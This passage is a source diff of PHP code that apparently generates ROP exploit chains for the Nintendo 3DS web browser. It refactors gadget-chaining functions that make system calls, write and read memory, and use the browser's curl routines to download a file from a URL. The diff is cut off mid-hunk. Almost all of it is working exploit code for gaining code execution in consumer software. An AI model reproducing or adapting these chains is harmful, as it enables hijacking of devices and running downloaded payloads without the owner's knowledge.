@@ -32,6 +32,8 @@ if(!strstr($ua, "Mozilla/5.0 (Nintendo 3DS; U; ; ") && !strstr($ua, "Mozilla/5.0
 	return;
 }
 
+if(!isset($generatebinrop))$generatebinrop = 0;
+
 $browserver = -1;
 
 //old3ds: browserver titlever sysver
@@ -759,6 +761,20 @@ function genu32_unicode_jswrap($value)
 	return $str;
 }
 
+function ropchain_appendu32($val)
+{
+	global $ROPCHAIN, $generatebinrop;
+
+	if($generatebinrop==0)
+	{
+		$ROPCHAIN.= genu32_unicode($val);
+	}
+	else
+	{
+		$ROPCHAIN.= pack("V*", $val);
+	}
+}
+
 function init_mapaddrs_cro()
 {
 	global $OSSCRO_MAPADR, $WEBKITCRO_MAPADR, $OSSCRO_HEAPADR, $PEERCRO_MAPADR, $WEBKITCRO_HEAPADR, $PEERCRO_HEAPADR, $CODEBLK_ENDADR, $browserver;
@@ -769,13 +785,15 @@ function init_mapaddrs_cro()
 
 function generate_ropchain()
 {
-	global $ROPCHAIN, $THROW_FATALERR, $ropchainselect;
+	global $ROPCHAIN, $generatebinrop, $THROW_FATALERR, $ropchainselect;
 
-	$ROPCHAIN = "\"";
+	$ROPCHAIN = "";
+
+	if($generatebinrop==0)$ROPCHAIN .= "\"";
 
 	if($ropchainselect==0)
 	{
-		$ROPCHAIN.= genu32_unicode($THROW_FATALERR);
+		ropchain_appendu32($THROW_FATALERR);
 	}
 	else if($ropchainselect==1)
 	{
@@ -794,39 +812,39 @@ function generate_ropchain()
 		generateropchain_type4();
 	}
 
-	$ROPCHAIN.= "\"";
+	if($generatebinrop==0)$ROPCHAIN.= "\"";
 }
 
 function ropgen_condfatalerr()
 {
-	global $ROPCHAIN, $COND_THROWFATALERR;
+	global $COND_THROWFATALERR;
 
-	$ROPCHAIN.= genu32_unicode($COND_THROWFATALERR);
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
+	ropchain_appendu32($COND_THROWFATALERR);
+	ropchain_appendu32(0x0);//r3
 }
 
 function ropgen_callfunc($r0, $r1, $r2, $r3, $lr, $pc)
 {
-	global $ROPCHAIN, $POPLRPC, $ROP_POP_R0R6PC;//$ROP_POP_R0R3PC;
+	global $POPLRPC, $ROP_POP_R0R6PC;//$ROP_POP_R0R3PC;
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
-	$ROPCHAIN.= genu32_unicode($lr);
+	ropchain_appendu32($POPLRPC);
+	ropchain_appendu32($lr);
 
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC/*$ROP_POP_R0R3PC*/);
-	$ROPCHAIN.= genu32_unicode($r0);
-	$ROPCHAIN.= genu32_unicode($r1);
-	$ROPCHAIN.= genu32_unicode($r2);
-	$ROPCHAIN.= genu32_unicode($r3);
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
+	ropchain_appendu32($ROP_POP_R0R6PC/*$ROP_POP_R0R3PC*/);
+	ropchain_appendu32($r0);
+	ropchain_appendu32($r1);
+	ropchain_appendu32($r2);
+	ropchain_appendu32($r3);
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32(0x0);//r6
 
-	$ROPCHAIN.= genu32_unicode($pc);
+	ropchain_appendu32($pc);
 }
 
 function ropgen_writeu32($addr, $value, $shiftval, $setr0)
 {
-	global $ROPCHAIN, $POPPC, $ROP_STR_R1TOR0, $POPLRPC, $ROP_POP_R1R5PC;//, $ROP_STR_R1_TOR0_SHIFTR2;
+	global $POPPC, $ROP_STR_R1TOR0, $POPLRPC, $ROP_POP_R1R5PC;//, $ROP_STR_R1_TOR0_SHIFTR2;
 
 	if($shiftval==0)
 	{
@@ -836,34 +854,34 @@ function ropgen_writeu32($addr, $value, $shiftval, $setr0)
 		}
 		else
 		{
-			$ROPCHAIN.= genu32_unicode($POPLRPC);
-			$ROPCHAIN.= genu32_unicode($POPPC);
+			ropchain_appendu32($POPLRPC);
+			ropchain_appendu32($POPPC);
 
-			$ROPCHAIN.= genu32_unicode($ROP_STR_R1TOR0);
+			ropchain_appendu32($ROP_STR_R1TOR0);
 		}
 	}
 	else
 	{
-		$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
-		$ROPCHAIN.= genu32_unicode($shiftval << 2);//r1
-		$ROPCHAIN.= genu32_unicode(0);//r2
-		$ROPCHAIN.= genu32_unicode(0x0);//r3
-		$ROPCHAIN.= genu32_unicode(0x0);//r4
-		$ROPCHAIN.= genu32_unicode(0x0);//r5
+		ropchain_appendu32($ROP_POP_R1R5PC);
+		ropchain_appendu32($shiftval << 2);//r1
+		ropchain_appendu32(0);//r2
+		ropchain_appendu32(0x0);//r3
+		ropchain_appendu32(0x0);//r4
+		ropchain_appendu32(0x0);//r5
 
-		$ROPCHAIN.= genu32_unicode($POPLRPC);
-		$ROPCHAIN.= genu32_unicode($POPPC);
+		ropchain_appendu32($POPLRPC);
+		ropchain_appendu32($POPPC);
 
-		$ROPCHAIN.= genu32_unicode($ROP_ADDR0_TO_R1);
+		ropchain_appendu32($ROP_ADDR0_TO_R1);
 
-		$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
-		$ROPCHAIN.= genu32_unicode($value);//r1
-		$ROPCHAIN.= genu32_unicode(0x0);//r2
-		$ROPCHAIN.= genu32_unicode(0x0);//r3
-		$ROPCHAIN.= genu32_unicode(0x0);//r4
-		$ROPCHAIN.= genu32_unicode(0x0);//r5
+		ropchain_appendu32($ROP_POP_R1R5PC);
+		ropchain_appendu32($value);//r1
+		ropchain_appendu32(0x0);//r2
+		ropchain_appendu32(0x0);//r3
+		ropchain_appendu32(0x0);//r4
+		ropchain_appendu32(0x0);//r5
 
-		$ROPCHAIN.= genu32_unicode($ROP_STR_R1TOR0);
+		ropchain_appendu32($ROP_STR_R1TOR0);
 
 		/*if($setr0!=0)
 		{
@@ -871,33 +889,33 @@ function ropgen_writeu32($addr, $value, $shiftval, $setr0)
 		}
 		else
 		{
-			$ROPCHAIN.= genu32_unicode($POPLRPC);
-			$ROPCHAIN.= genu32_unicode($POPPC);
+			ropchain_appendu32($POPLRPC);
+			ropchain_appendu32($POPPC);
 
-			$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
-			$ROPCHAIN.= genu32_unicode($value);//r1
-			$ROPCHAIN.= genu32_unicode($shiftval);//r2
-			$ROPCHAIN.= genu32_unicode(0x0);//r3
-			$ROPCHAIN.= genu32_unicode(0x0);//r4
-			$ROPCHAIN.= genu32_unicode(0x0);//r5
+			ropchain_appendu32($ROP_POP_R1R5PC);
+			ropchain_appendu32($value);//r1
+			ropchain_appendu32($shiftval);//r2
+			ropchain_appendu32(0x0);//r3
+			ropchain_appendu32(0x0);//r4
+			ropchain_appendu32(0x0);//r5
 
-			$ROPCHAIN.= genu32_unicode($ROP_STR_R1_TOR0_SHIFTR2);
+			ropchain_appendu32($ROP_STR_R1_TOR0_SHIFTR2);
 		}*/
 	}
 }
 
 function ropgen_readu32($addr, $shiftval, $setr0)//r0 = u32 loaded from addr
 {
-	global $ROPCHAIN, $ROP_POP_R0PC, $POPPC, $POPLRPC, $ROP_LDR_R0FROMR0, $ROP_LDR_R0_FROMR0_SHIFTR1, $ROP_POP_R1R5PC;
+	global $ROP_POP_R0PC, $POPPC, $POPLRPC, $ROP_LDR_R0FROMR0, $ROP_LDR_R0_FROMR0_SHIFTR1, $ROP_POP_R1R5PC;
 
 	if($shiftval==0)
 	{
-		$ROPCHAIN.= genu32_unicode($ROP_POP_R0PC);
-		$ROPCHAIN.= genu32_unicode($addr);//r0
-		$ROPCHAIN.= genu32_unicode($POPLRPC);
+		ropchain_appendu32($ROP_POP_R0PC);
+		ropchain_appendu32($addr);//r0
+		ropchain_appendu32($POPLRPC);
 
-		$ROPCHAIN.= genu32_unicode($POPPC);//lr
-		$ROPCHAIN.= genu32_unicode($ROP_LDR_R0FROMR0);
+		ropchain_appendu32($POPPC);//lr
+		ropchain_appendu32($ROP_LDR_R0FROMR0);
 	}
 	else
 	{
@@ -907,65 +925,65 @@ function ropgen_readu32($addr, $shiftval, $setr0)//r0 = u32 loaded from addr
 		}
 		else
 		{
-			$ROPCHAIN.= genu32_unicode($POPLRPC);
-			$ROPCHAIN.= genu32_unicode($POPPC);
+			ropchain_appendu32($POPLRPC);
+			ropchain_appendu32($POPPC);
 
-			$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
-			$ROPCHAIN.= genu32_unicode($shiftval);//r1
-			$ROPCHAIN.= genu32_unicode(0x0);//r2
-			$ROPCHAIN.= genu32_unicode(0x0);//r3
-			$ROPCHAIN.= genu32_unicode(0x0);//r4
-			$ROPCHAIN.= genu32_unicode(0x0);//r5
+			ropchain_appendu32($ROP_POP_R1R5PC);
+			ropchain_appendu32($shiftval);//r1
+			ropchain_appendu32(0x0);//r2
+			ropchain_appendu32(0x0);//r3
+			ropchain_appendu32(0x0);//r4
+			ropchain_appendu32(0x0);//r5
 
-			$ROPCHAIN.= genu32_unicode($ROP_LDR_R0_FROMR0_SHIFTR1);
+			ropchain_appendu32($ROP_LDR_R0_FROMR0_SHIFTR1);
 		}
 	}
 }
 
 function ropgen_getptr_threadlocalstorage()//r0 = threadlocalstorage-ptr
 {
-	global $ROPCHAIN, $ROPHEAP, $browserver, $ROP_WRITETHREADSTORAGEPTR_TOR4R5, $ROP_POP_R0IPPC;
+	global $ROPHEAP, $browserver, $ROP_WRITETHREADSTORAGEPTR_TOR4R5, $ROP_POP_R0IPPC;
 
 	//$browserver==1 $ROP_WRITETHREADSTORAGEPTR_TOR4R5: if(r0!=0){r0 = <threadlocalstorageptr>; <write r0 to r4+4> branch to: "pop {r4, r5, r6, r7, r8, pc}"}
 	//$browserver==2 $ROP_WRITETHREADSTORAGEPTR_TOR4R5: if(ip!=0){r0 = <threadlocalstorageptr>; <write r0 to r5+4> branch over a function-call} <func-call that can be skipped> *(((u32*)r5+8)++; r0=r4; "pop {r4, r5, r6, pc}"
 	//$browserver==3 $ROP_WRITETHREADSTORAGEPTR_TOR4R5: if(r0!=0){r0 = <threadlocalstorageptr>; <write r0 to r4+4> *(((u32*)r4+8)++; r0=1} "pop {r4, pc}"
 
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R0IPPC);
+	ropchain_appendu32($ROP_POP_R0IPPC);
 
-	$ROPCHAIN.= genu32_unicode(0x1);//r0
-	$ROPCHAIN.= genu32_unicode(0x0);//r1
-	$ROPCHAIN.= genu32_unicode(0x0);//r2
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
-	$ROPCHAIN.= genu32_unicode($ROPHEAP);//r4
-	$ROPCHAIN.= genu32_unicode($ROPHEAP);//r5
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
-	$ROPCHAIN.= genu32_unicode(0x0);//r7
-	$ROPCHAIN.= genu32_unicode(0x0);//r8
-	$ROPCHAIN.= genu32_unicode(0x0);//r9
-	$ROPCHAIN.= genu32_unicode(0x0);//sl
-	$ROPCHAIN.= genu32_unicode(0x0);//fp
-	$ROPCHAIN.= genu32_unicode(0x1);//ip
-	$ROPCHAIN.= genu32_unicode($ROP_WRITETHREADSTORAGEPTR_TOR4R5);
+	ropchain_appendu32(0x1);//r0
+	ropchain_appendu32(0x0);//r1
+	ropchain_appendu32(0x0);//r2
+	ropchain_appendu32(0x0);//r3
+	ropchain_appendu32($ROPHEAP);//r4
+	ropchain_appendu32($ROPHEAP);//r5
+	ropchain_appendu32(0x0);//r6
+	ropchain_appendu32(0x0);//r7
+	ropchain_appendu32(0x0);//r8
+	ropchain_appendu32(0x0);//r9
+	ropchain_appendu32(0x0);//sl
+	ropchain_appendu32(0x0);//fp
+	ropchain_appendu32(0x1);//ip
+	ropchain_appendu32($ROP_WRITETHREADSTORAGEPTR_TOR4R5);
 
 	if($browserver==1)
 	{
-		$ROPCHAIN.= genu32_unicode(0x0);//r4
-		$ROPCHAIN.= genu32_unicode(0x0);//r5
-		$ROPCHAIN.= genu32_unicode(0x0);//r6
-		$ROPCHAIN.= genu32_unicode(0x0);//r7
-		$ROPCHAIN.= genu32_unicode(0x0);//r8
+		ropchain_appendu32(0x0);//r4
+		ropchain_appendu32(0x0);//r5
+		ropchain_appendu32(0x0);//r6
+		ropchain_appendu32(0x0);//r7
+		ropchain_appendu32(0x0);//r8
 	}
 	else if($browserver==2)
 	{
-		$ROPCHAIN.= genu32_unicode(0x0);//r4
-		$ROPCHAIN.= genu32_unicode(0x0);//r5
-		$ROPCHAIN.= genu32_unicode(0x0);//r6
+		ropchain_appendu32(0x0);//r4
+		ropchain_appendu32(0x0);//r5
+		ropchain_appendu32(0x0);//r6
 
 		ropgen_readu32($ROPHEAP+4, 0, 1);
 	}
 	else if($browserver>=3)
 	{
-		$ROPCHAIN.= genu32_unicode(0x0);//r4
+		ropchain_appendu32(0x0);//r4
 		
 		ropgen_readu32($ROPHEAP+4, 0, 1);
 	}
@@ -995,108 +1013,108 @@ function ropgen_readu32_cmdbuf($indexword)//r0 = word loaded from cmdbuf
 
 function ropgen_write_procid_cmdbuf($indexword)//This writes the current processid to the specified cmdbuf indexword.
 {
-	global $ROPCHAIN, $ROPHEAP, $POPPC, $svcGetProcessId, $POPLRPC, $ROP_POP_R1R5PC, $ROP_ADDR0_TO_R1;//, $ROP_POP_R0PC, $ROP_WRITEU32_TOTHREADSTORAGE;
+	global $ROPHEAP, $POPPC, $svcGetProcessId, $POPLRPC, $ROP_POP_R1R5PC, $ROP_ADDR0_TO_R1;//, $ROP_POP_R0PC, $ROP_WRITEU32_TOTHREADSTORAGE;
 
 	ropgen_getptr_threadlocalstorage();//r0 = localstorage ptr
 	
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
-	$ROPCHAIN.= genu32_unicode($POPPC);//lr
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
+	ropchain_appendu32($POPLRPC);
+	ropchain_appendu32($POPPC);//lr
+	ropchain_appendu32($ROP_POP_R1R5PC);
 
-	$ROPCHAIN.= genu32_unicode((0x20+$indexword) * 4);//r1
-	$ROPCHAIN.= genu32_unicode(0x0);//r2
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode($ROP_ADDR0_TO_R1);
+	ropchain_appendu32((0x20+$indexword) * 4);//r1
+	ropchain_appendu32(0x0);//r2
+	ropchain_appendu32(0x0);//r3
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32($ROP_ADDR0_TO_R1);
 
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
+	ropchain_appendu32($ROP_POP_R1R5PC);
 
-	$ROPCHAIN.= genu32_unicode(0xffff8001);//r1
-	$ROPCHAIN.= genu32_unicode(0x0);//r2
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode($svcGetProcessId);
+	ropchain_appendu32(0xffff8001);//r1
+	ropchain_appendu32(0x0);//r2
+	ropchain_appendu32(0x0);//r3
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32($svcGetProcessId);
 
 	/*ropgen_writeu32($ROPHEAP+4, 0x20 + $indexword, 0, 1);
 	ropgen_callfunc($ROPHEAP, 0xffff8001, 0x0, 0x0, $POPPC, $svcGetProcessId);
 
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R0PC);
-	$ROPCHAIN.= genu32_unicode($ROPHEAP+4);//r0
+	ropchain_appendu32($ROP_POP_R0PC);
+	ropchain_appendu32($ROPHEAP+4);//r0
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
-	$ROPCHAIN.= genu32_unicode($POPPC);
-	$ROPCHAIN.= genu32_unicode($ROP_WRITEU32_TOTHREADSTORAGE);*/
+	ropchain_appendu32($POPLRPC);
+	ropchain_appendu32($POPPC);
+	ropchain_appendu32($ROP_WRITEU32_TOTHREADSTORAGE);*/
 }
 
 function ropgen_writeregdata($addr, $data, $pos)
 {
-	global $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0IPPC, $ROP_STMR0_R0PC, $ROP_POP_R0R8PC, $browserver;
+	global $POPLRPC, $POPPC, $ROP_POP_R0IPPC, $ROP_STMR0_R0PC, $ROP_POP_R0R8PC, $browserver;
 
 	if($browserver<0x80)
 	{
-		$ROPCHAIN.= genu32_unicode($POPLRPC);
+		ropchain_appendu32($POPLRPC);
 
-		$ROPCHAIN.= genu32_unicode($POPPC);//lr
-		$ROPCHAIN.= genu32_unicode($ROP_POP_R0IPPC);
+		ropchain_appendu32($POPPC);//lr
+		ropchain_appendu32($ROP_POP_R0IPPC);
 
-		$ROPCHAIN.= genu32_unicode($addr);
-		$ROPCHAIN.= genu32_unicode($data[$pos+0]);//0x30-bytes total from $data
-		$ROPCHAIN.= genu32_unicode($data[$pos+1]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+2]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+3]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+4]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+5]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+6]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+7]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+8]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+9]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+10]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+11]);
+		ropchain_appendu32($addr);
+		ropchain_appendu32($data[$pos+0]);//0x30-bytes total from $data
+		ropchain_appendu32($data[$pos+1]);
+		ropchain_appendu32($data[$pos+2]);
+		ropchain_appendu32($data[$pos+3]);
+		ropchain_appendu32($data[$pos+4]);
+		ropchain_appendu32($data[$pos+5]);
+		ropchain_appendu32($data[$pos+6]);
+		ropchain_appendu32($data[$pos+7]);
+		ropchain_appendu32($data[$pos+8]);
+		ropchain_appendu32($data[$pos+9]);
+		ropchain_appendu32($data[$pos+10]);
+		ropchain_appendu32($data[$pos+11]);
 
-		$ROPCHAIN.= genu32_unicode($ROP_STMR0_R0PC);//"stm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip, sp, lr, pc}"
+		ropchain_appendu32($ROP_STMR0_R0PC);//"stm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip, sp, lr, pc}"
 	}
 	else
 	{
-		$ROPCHAIN.= genu32_unicode($ROP_POP_R0R8PC);
+		ropchain_appendu32($ROP_POP_R0R8PC);
 
-		$ROPCHAIN.= genu32_unicode($addr);
-		$ROPCHAIN.= genu32_unicode($data[$pos+0]);//0x1c-bytes from $data
-		$ROPCHAIN.= genu32_unicode($data[$pos+1]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+2]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+3]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+4]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+5]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+6]);
-		$ROPCHAIN.= genu32_unicode(0);//r8
+		ropchain_appendu32($addr);
+		ropchain_appendu32($data[$pos+0]);//0x1c-bytes from $data
+		ropchain_appendu32($data[$pos+1]);
+		ropchain_appendu32($data[$pos+2]);
+		ropchain_appendu32($data[$pos+3]);
+		ropchain_appendu32($data[$pos+4]);
+		ropchain_appendu32($data[$pos+5]);
+		ropchain_appendu32($data[$pos+6]);
+		ropchain_appendu32(0);//r8
 		
 		$pos+=7;
 		$addr+=0x1c;
 
-		$ROPCHAIN.= genu32_unicode($ROP_STMR0_R0PC);//"stmia r0!, {r1, r2, r3, r4, r5, r6, r7}" ... "pop {r4, r5, r6, pc}"
+		ropchain_appendu32($ROP_STMR0_R0PC);//"stmia r0!, {r1, r2, r3, r4, r5, r6, r7}" ... "pop {r4, r5, r6, pc}"
 
-		$ROPCHAIN.= genu32_unicode(0);//r4
-		$ROPCHAIN.= genu32_unicode(0);//r5
-		$ROPCHAIN.= genu32_unicode(0);//r6
+		ropchain_appendu32(0);//r4
+		ropchain_appendu32(0);//r5
+		ropchain_appendu32(0);//r6
 
-		$ROPCHAIN.= genu32_unicode($ROP_POP_R0R8PC);
+		ropchain_appendu32($ROP_POP_R0R8PC);
 
-		$ROPCHAIN.= genu32_unicode($addr);
-		$ROPCHAIN.= genu32_unicode($data[$pos+0]);//0x14-bytes from $data
-		$ROPCHAIN.= genu32_unicode($data[$pos+1]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+2]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+3]);
-		$ROPCHAIN.= genu32_unicode($data[$pos+4]);
-		$ROPCHAIN.= genu32_unicode(0);
-		$ROPCHAIN.= genu32_unicode(0);
-		$ROPCHAIN.= genu32_unicode(0);//r8
+		ropchain_appendu32($addr);
+		ropchain_appendu32($data[$pos+0]);//0x14-bytes from $data
+		ropchain_appendu32($data[$pos+1]);
+		ropchain_appendu32($data[$pos+2]);
+		ropchain_appendu32($data[$pos+3]);
+		ropchain_appendu32($data[$pos+4]);
+		ropchain_appendu32(0);
+		ropchain_appendu32(0);
+		ropchain_appendu32(0);//r8
 
-		$ROPCHAIN.= genu32_unicode($ROP_STMR0_R0PC);
+		ropchain_appendu32($ROP_STMR0_R0PC);
 
-		$ROPCHAIN.= genu32_unicode(0);//r4
-		$ROPCHAIN.= genu32_unicode(0);//r5
-		$ROPCHAIN.= genu32_unicode(0);//r6
+		ropchain_appendu32(0);//r4
+		ropchain_appendu32(0);//r5
+		ropchain_appendu32(0);//r6
 	}
 }
 
@@ -1143,42 +1161,42 @@ function ropgen_writeregdata_wrap($addr, $data, $pos, $size)//write the u32s fro
 
 function ropgen_ldm_r0r3($ldm_addr, $stm_addr)
 {
-	global $ROPCHAIN, $ROP_POP_R0R6PC, $ROP_LDMSTM_R5R4_R0R3, $browserver;
+	global $ROP_POP_R0R6PC, $ROP_LDMSTM_R5R4_R0R3, $browserver;
 
 	if($stm_addr==0)$stm_addr = $ldm_addr;
 
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
-	$ROPCHAIN.= genu32_unicode(0x1);//r0
-	$ROPCHAIN.= genu32_unicode(0x0);//r1
-	$ROPCHAIN.= genu32_unicode(0x0);//r2
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
-	$ROPCHAIN.= genu32_unicode($stm_addr);//r4
-	$ROPCHAIN.= genu32_unicode($ldm_addr);//r5
-	$ROPCHAIN.= genu32_unicode($stm_addr);//r6
+	ropchain_appendu32($ROP_POP_R0R6PC);
+	ropchain_appendu32(0x1);//r0
+	ropchain_appendu32(0x0);//r1
+	ropchain_appendu32(0x0);//r2
+	ropchain_appendu32(0x0);//r3
+	ropchain_appendu32($stm_addr);//r4
+	ropchain_appendu32($ldm_addr);//r5
+	ropchain_appendu32($stm_addr);//r6
 
-	$ROPCHAIN.= genu32_unicode($ROP_LDMSTM_R5R4_R0R3);//"cmp r0, #0" "ldmne r5, {r0, r1, r2, r3}" "stmne r4, {r0, r1, r2, r3}" "popne {r4, r5, r6, pc}"
+	ropchain_appendu32($ROP_LDMSTM_R5R4_R0R3);//"cmp r0, #0" "ldmne r5, {r0, r1, r2, r3}" "stmne r4, {r0, r1, r2, r3}" "popne {r4, r5, r6, pc}"
 
 	if($browserver >= 0x80)
 	{
-		$ROPCHAIN.= genu32_unicode(0x0);//two words for d8
-		$ROPCHAIN.= genu32_unicode(0x0);
+		ropchain_appendu32(0x0);//two words for d8
+		ropchain_appendu32(0x0);
 	}
 
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32(0x0);//r6
 }
 
 function ropgen_sendcmd($handleadr, $check_cmdret)
 {
-	global $ROPCHAIN, $POPPC, $POPPC, $POPLRPC, $svcSendSyncRequest;
+	global $POPPC, $POPPC, $POPLRPC, $svcSendSyncRequest;
 
 	ropgen_readu32($handleadr, 0, 1);
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
-	$ROPCHAIN.= genu32_unicode($POPPC);//lr
+	ropchain_appendu32($POPLRPC);
+	ropchain_appendu32($POPPC);//lr
 
-	$ROPCHAIN.= genu32_unicode($svcSendSyncRequest);
+	ropchain_appendu32($svcSendSyncRequest);
 	ropgen_condfatalerr();
 
 	if($check_cmdret)
@@ -1190,53 +1208,53 @@ function ropgen_sendcmd($handleadr, $check_cmdret)
 
 function ropgen_curl_easy_init($curlstate)
 {
-	global $ROPCHAIN, $ROP_curl_easy_init, $POPLRPC, $POPPC, $ROP_POP_R1R5PC, $ROP_STR_R0TOR1;
+	global $ROP_curl_easy_init, $POPLRPC, $POPPC, $ROP_POP_R1R5PC, $ROP_STR_R0TOR1;
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
+	ropchain_appendu32($POPLRPC);
 
-	$ROPCHAIN.= genu32_unicode($POPPC);//lr
-	$ROPCHAIN.= genu32_unicode($ROP_curl_easy_init);
+	ropchain_appendu32($POPPC);//lr
+	ropchain_appendu32($ROP_curl_easy_init);
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
+	ropchain_appendu32($POPLRPC);
 
-	$ROPCHAIN.= genu32_unicode($POPPC);//lr
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
+	ropchain_appendu32($POPPC);//lr
+	ropchain_appendu32($ROP_POP_R1R5PC);
 
-	$ROPCHAIN.= genu32_unicode($curlstate);//r1
-	$ROPCHAIN.= genu32_unicode(0x0);//r2
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode($ROP_STR_R0TOR1);//Write the output CURL* ptr from curl_easy_init() to $curlstate.
+	ropchain_appendu32($curlstate);//r1
+	ropchain_appendu32(0x0);//r2
+	ropchain_appendu32(0x0);//r3
+	ropchain_appendu32(0x0);//r4
+	ropchain_appendu32(0x0);//r5
+	ropchain_appendu32($ROP_STR_R0TOR1);//Write the output CURL* ptr from curl_easy_init() to $curlstate.
 }
 
 function ropgen_curl_easy_cleanup($curlstate)
 {
-	global $ROPCHAIN, $POPLRPC, $POPPC, $ROP_curl_easy_cleanup;
+	global $POPLRPC, $POPPC, $ROP_curl_easy_cleanup;
 
 	ropgen_ldm_r0r3($curlstate, 0);
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
+	ropchain_appendu32($POPLRPC);
 
-	$ROPCHAIN.= genu32_unicode($POPPC);//lr
-	$ROPCHAIN.= genu32_unicode($ROP_curl_easy_cleanup);
+	ropchain_appendu32($POPPC);//lr
+	ropchain_appendu32($ROP_curl_easy_cleanup);
 }
 
 function ropgen_curl_easy_perform($curlstate)
 {
-	global $ROPCHAIN, $POPLRPC, $POPPC, $ROP_curl_easy_perform;
+	global $POPLRPC, $POPPC, $ROP_curl_easy_perform;
 
 	ropgen_ldm_r0r3($curlstate, 0);
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
+	ropchain_appendu32($POPLRPC);
 
-	$ROPCHAIN.= genu32_unicode($POPPC);//lr
-	$ROPCHAIN.= genu32_unicode($ROP_curl_easy_perform);
+	ropchain_appendu32($POPPC);//lr
+	ropchain_appendu32($ROP_curl_easy_perform);
 }
 
 function ropgen_curl_easy_setopt($curlstate, $type, $value, $set_params)
 {
-	global $ROPCHAIN, $POPLRPC, $POPPC, $ROP_curl_easy_setopt;
+	global $POPLRPC, $POPPC, $ROP_curl_easy_setopt;
 
 	if($set_params!=0)
 	{
@@ -1246,15 +1264,15 @@ function ropgen_curl_easy_setopt($curlstate, $type, $value, $set_params)
 
 	ropgen_ldm_r0r3($curlstate, 0);
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
+	ropchain_appendu32($POPLRPC);
 
-	$ROPCHAIN.= genu32_unicode($POPPC);//lr
-	$ROPCHAIN.= genu32_unicode($ROP_curl_easy_setopt);
+	ropchain_appendu32($POPPC);//lr
+	ropchain_appendu32($ROP_curl_easy_setopt);
 }
 
 function ropgen_httpdownload($bufaddr, $bufsize, $filepath, $url, $delete_tmpfile)
 {
-	global $ROPCHAIN, $ROPHEAP, $POPPC, $POPLRPC, $ROP_POP_R1R5PC, $WKC_FOPEN, $WKC_FCLOSE, $WKC_FREAD, $WKC_FWRITE, $WKC_FSEEK, $FS_DELETEFILE, $ROP_STR_R0TOR1, $ROP_MEMSETOTHER;
+	global $ROPHEAP, $POPPC, $POPLRPC, $ROP_POP_R1R5PC, $WKC_FOPEN, $WKC_FCLOSE, $WKC_FREAD, $WKC_FWRITE, $WKC_FSEEK, $FS_DELETEFILE, $ROP_STR_R0TOR1, $ROP_MEMSETOTHER;
 
 	$FD_ADDR = $ROPHEAP+0x140;
 	$curlstate = $FD_ADDR+0x10;
@@ -1275,22 +1293,22 @@ function ropgen_httpdownload($bufaddr, $bufsize, $filepath, $url, $delete_tmpfil
 
 	ropgen_callfunc($ROPHEAP+0x80, $ROPHEAP+0xc0, 0x0, 0x0, $POPPC, $WKC_FOPEN);//Open the file @ $filepath with mode "w+", via wkc_fopen().
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
